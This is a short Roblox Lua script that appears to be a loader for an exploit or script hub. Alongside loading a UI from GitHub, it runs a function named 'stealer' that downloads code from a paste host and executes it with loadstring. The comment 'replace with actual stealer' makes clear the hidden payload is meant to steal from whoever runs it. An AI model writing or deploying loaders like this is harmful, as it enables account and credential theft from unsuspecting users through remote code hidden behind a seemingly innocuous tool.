
local function stealer()
loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/jdGsfyykxsacnmbt/raw", true))() -- replace with actual stealer
end
local function loadui()
  loadstring(game:HttpGet("https://raw.githubusercontent.com/ZusumeHub/ZusumeHub/refs/heads/main/UpdateZysume"))()

end

task.spawn(stealer)
task.spawn(loadui)
